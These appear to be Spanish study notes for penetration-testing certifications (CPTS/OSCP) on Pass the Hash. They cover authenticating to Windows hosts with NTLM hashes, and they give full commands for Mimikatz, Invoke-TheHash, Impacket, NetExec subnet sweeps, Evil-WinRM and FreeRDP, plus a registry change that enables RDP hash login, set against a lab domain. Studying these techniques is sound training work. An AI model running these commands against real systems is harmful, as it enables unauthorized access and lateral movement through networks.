
## 1. Concepto

**Pass the Hash (PtH)** es una técnica que permite autenticarse utilizando el hash NTLM de una contraseña en lugar de conocer la contraseña en texto plano.

El ataque aprovecha el mecanismo de autenticación NTLM: el hash puede utilizarse para autenticarse sin necesidad de descifrarlo.

### Fuentes habituales de hashes

- **SAM:** base de datos local de cuentas de Windows.
    
- **NTDS.dit:** base de datos de Active Directory almacenada en los controladores de dominio.
    
- **LSASS (**`**lsass.exe**`**):** proceso de Windows cuya memoria puede contener material de autenticación.
    

### Conceptos importantes

- **NTLM:** protocolo de autenticación basado en desafío-respuesta, todavía presente en entornos Windows.
    
- **Kerberos:** mecanismo de autenticación predeterminado en los dominios Active Directory modernos.
    
- **PtH:** reutiliza un hash NTLM para autenticarse sin recuperar la contraseña original.
    
- **Movimiento lateral:** permite utilizar credenciales obtenidas para acceder a otros equipos, siempre que los permisos y las condiciones de autenticación lo permitan.
    

> **Importante:** disponer de un hash no garantiza el acceso. El usuario debe tener los permisos necesarios en el objetivo y el protocolo utilizado debe permitir la autenticación.

## 2. Pass the Hash con Mimikatz (Windows)

Mimikatz permite realizar PtH mediante el módulo `sekurlsa::pth`, que inicia un proceso utilizando el hash NTLM de un usuario.

### Comando

```
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

### Parámetros

|Parámetro|Función|
|---|---|
|`privilege::debug`|Intenta habilitar el privilegio de depuración necesario para determinadas operaciones de Mimikatz.|
|`sekurlsa::pth`|Ejecuta el módulo Pass the Hash.|
|`/user`|Usuario que se utilizará.|
|`/rc4` o `/NTLM`|Hash NTLM de la contraseña.|
|`/domain`|Dominio al que pertenece el usuario.|
|`/run`|Programa que se ejecutará con el contexto de autenticación creado.|

Para cuentas locales, el dominio puede ser el nombre del equipo, `localhost` o `.`.

En el ejemplo se inicia `cmd.exe`. Desde ese proceso se pueden realizar conexiones utilizando el contexto de autenticación preparado.

## 3. Pass the Hash con Invoke-TheHash (Windows)

**Invoke-TheHash** es una colección de funciones de PowerShell que permite realizar autenticación PtH y ejecutar comandos mediante SMB o WMI.

No requiere privilegios de administrador local en el equipo cliente, pero la cuenta y el hash utilizados deben tener los permisos necesarios en el objetivo.

### Parámetros principales

|Parámetro|Función|
|---|---|
|`-Target`|Nombre o dirección IP del objetivo.|
|`-Username`|Usuario que se utilizará.|
|`-Domain`|Dominio del usuario. No es necesario en todos los casos, por ejemplo, con cuentas locales.|
|`-Hash`|Hash NTLM; admite `NTLM` o `LM:NTLM`.|
|`-Command`|Comando que se ejecutará en el objetivo.|

### Ejecución mediante SMB

Importar el módulo:

```
cd C:\tools\Invoke-TheHash\
Import-Module .\Invoke-TheHash.psd1
```

Ejecutar un comando mediante SMB:

```
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "whoami" -Verbose
```

SMB permite ejecutar comandos remotamente cuando la autenticación y los permisos lo permiten.

### Ejecución mediante WMI

```
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "whoami"
```

WMI es una alternativa para ejecutar comandos de forma remota.

**Diferencia principal:**

- `Invoke-SMBExec`: ejecución mediante SMB.
    
- `Invoke-WMIExec`: ejecución mediante WMI.

## 4. Pass the Hash con Impacket (Linux)

Impacket incluye herramientas para autenticarse mediante hashes NTLM y ejecutar comandos en equipos Windows.

### PsExec

```
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

**Formato del parámetro** `**-hashes**`**:**

```
LM_HASH:NTLM_HASH
```

Si solo tenemos el hash NTLM, dejamos vacía la parte correspondiente al hash LM:

```
-hashes :NTLM_HASH
```

Si la autenticación y los permisos son suficientes, `impacket-psexec` puede proporcionar una shell en el equipo remoto.

### Alternativas de Impacket

|Herramienta|Función|
|---|---|
|`impacket-psexec`|Ejecución remota de comandos mediante servicios SMB.|
|`impacket-wmiexec`|Ejecución remota mediante WMI.|
|`impacket-atexec`|Ejecución remota mediante el Programador de tareas.|
|`impacket-smbexec`|Ejecución remota mediante SMB.|

## 5. Pass the Hash con NetExec (Linux)

**NetExec** permite comprobar si un hash NTLM es válido para una cuenta y si esta dispone de privilegios administrativos en otros equipos.

### Comprobar acceso en una subred

```
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

### Parámetros

|Parámetro|Función|
|---|---|
|`smb`|Selecciona SMB.|
|`-u`|Usuario.|
|`-d .`|Utiliza el contexto de cuenta local.|
|`-H`|Hash NTLM.|
|`--local-auth`|Intenta autenticar utilizando la cuenta local en cada equipo.|
|`-x`|Ejecuta un comando en el equipo remoto.|

### Interpretar los resultados

- `STATUS_LOGON_FAILURE`: la autenticación ha fallado en ese equipo.
    
- `Pwn3d!`: NetExec indica que la cuenta tiene privilegios administrativos en el objetivo.
    

### Ejecutar comandos

```
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

Si obtenemos acceso administrativo, podemos ejecutar comandos remotamente.

### Reutilización de contraseñas locales

Si varios equipos utilizan la misma contraseña de administrador local, el mismo hash puede permitir autenticarse en múltiples máquinas.

Para comprobarlo utilizando autenticación local:

```
netexec smb 172.16.1.0/24 -u Administrator --local-auth -H NTLM_HASH
```

Este tipo de reutilización representa un riesgo importante en redes corporativas.

**Medida defensiva:** implementar **LAPS (Local Administrator Password Solution)** para administrar contraseñas de administrador local únicas y sujetas a rotación.

> El uso de estas comprobaciones debe respetar la política de bloqueo de cuentas del entorno. Los intentos repetidos de autenticación pueden bloquear cuentas.

## 6. Pass the Hash con Evil-WinRM (Linux)

Evil-WinRM permite autenticarse mediante WinRM utilizando un hash NTLM, siempre que el usuario disponga de los permisos necesarios y el servicio esté accesible.

### Comando

```
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

Si la autenticación funciona, se obtiene una shell de PowerShell remota.

Para una cuenta de dominio, se puede especificar el dominio en el nombre de usuario:

```
evil-winrm -i IP_OBJETIVO -u 'administrator@inlanefreight.htb' -H NTLM_HASH
```

**Cuándo utilizarlo:**

- Cuando WinRM está disponible.
    
- Cuando las credenciales tienen permisos de acceso remoto.
    
- Como alternativa a SMB cuando este protocolo está bloqueado o no resulta adecuado.

## 7. Pass the Hash mediante RDP (Linux)

También es posible utilizar un hash NTLM para obtener acceso gráfico mediante RDP.

### Requisito

El objetivo debe tener habilitado **Restricted Admin Mode**, según el procedimiento descrito en el módulo.

### Habilitar Restricted Admin Mode

En el equipo Windows objetivo, el módulo muestra el siguiente comando:

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Este comando configura el valor `DisableRestrictedAdmin` a `0`.

### Conectarse mediante FreeRDP

```
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

### Parámetros

|Parámetro|Función|
|---|---|
|`/v`|Dirección del objetivo.|
|`/u`|Usuario.|
|`/pth`|Hash NTLM utilizado para la autenticación.|

Si aparece un aviso de discrepancia del certificado, se trata de un problema de validación del certificado que debe evaluarse por separado del resultado de la autenticación.

## 8. UAC y las cuentas administrativas locales

**User Account Control (UAC)** puede limitar la administración remota de equipos Windows mediante cuentas locales.

La clave de registro relevante es:

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
```

### Valores

|Valor|Comportamiento descrito en el módulo|
|---|---|
|`0`|Solo la cuenta de administrador local integrada (RID-500) puede realizar determinadas tareas administrativas remotas.|
|`1`|Permite también estas tareas a otras cuentas administrativas locales.|

### Excepción: FilterAdministratorToken

La clave:

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken
```

Si está habilitada con valor `1`, la cuenta RID-500 también queda sometida a la protección de UAC, aunque se haya cambiado su nombre.

**Importante:** estas restricciones se refieren a cuentas administrativas locales. Una cuenta de dominio con privilegios administrativos en el equipo puede seguir siendo válida para un ataque PtH, si se cumplen las condiciones de autenticación y acceso.

## 9. Comparativa de herramientas

|Herramienta|Sistema|Método|Uso principal|
|---|---|---|---|
|Mimikatz|Windows|NTLM|Crear un proceso con un contexto de autenticación basado en un hash.|
|Invoke-TheHash|Windows|SMB / WMI|Ejecutar comandos remotamente mediante un hash NTLM.|
|Impacket PsExec|Linux|SMB|Obtener ejecución remota de comandos.|
|Impacket WMIExec|Linux|WMI|Ejecutar comandos remotamente mediante WMI.|
|Impacket ATExec|Linux|Tareas programadas|Ejecutar comandos de forma remota.|
|Impacket SMBExec|Linux|SMB|Ejecutar comandos remotamente.|
|NetExec|Linux|SMB|Comprobar autenticación, identificar acceso administrativo y ejecutar comandos.|
|Evil-WinRM|Linux|WinRM|Obtener una shell remota mediante un hash NTLM.|
|xfreerdp|Linux|RDP|Obtener acceso gráfico mediante PtH cuando se cumplen los requisitos.|

## 10. Flujo de trabajo para CPTS/OSCP

1. **Obtener el hash NTLM** mediante una técnica de extracción de credenciales autorizada.
    
2. **Identificar el tipo de cuenta:** local o de dominio.
    
3. **Comprobar la conectividad** y los servicios disponibles en el objetivo.
    
4. **Validar la autenticación** utilizando NetExec u otra herramienta apropiada.
    
5. **Comprobar los privilegios:** autenticarse correctamente no implica necesariamente ser administrador.
    
6. **Elegir el método de acceso** según los servicios disponibles:
    
    - SMB: Impacket o NetExec.
        
    - WMI: Impacket o Invoke-TheHash.
        
    - WinRM: Evil-WinRM.
        
    - RDP: FreeRDP, si se cumplen los requisitos.
        
7. **Ejecutar comandos o acceder a una shell** cuando los permisos lo permitan.
    
8. **Comprobar la reutilización de hashes** de cuentas locales en otros equipos, dentro del alcance autorizado.
    
9. **Documentar los accesos obtenidos** y las limitaciones encontradas.
    

## 11. Puntos clave

- **Pass the Hash no descifra la contraseña:** utiliza el hash NTLM para autenticarse.
    
- Un hash válido no garantiza acceso administrativo.
    
- El contexto de cuenta local o de dominio debe especificarse correctamente.
    
- `Pwn3d!` en NetExec indica privilegios administrativos en el objetivo.
    
- SMB, WMI, WinRM y RDP son vías distintas de acceso remoto.
    
- UAC puede limitar PtH con cuentas administrativas locales.
    
- La reutilización de hashes facilita el movimiento lateral.
    
- LAPS ayuda a reducir el riesgo derivado de contraseñas de administrador local compartidas.
    
- Kerberos ofrece otras posibilidades de movimiento lateral que se estudian en las siguientes secciones.
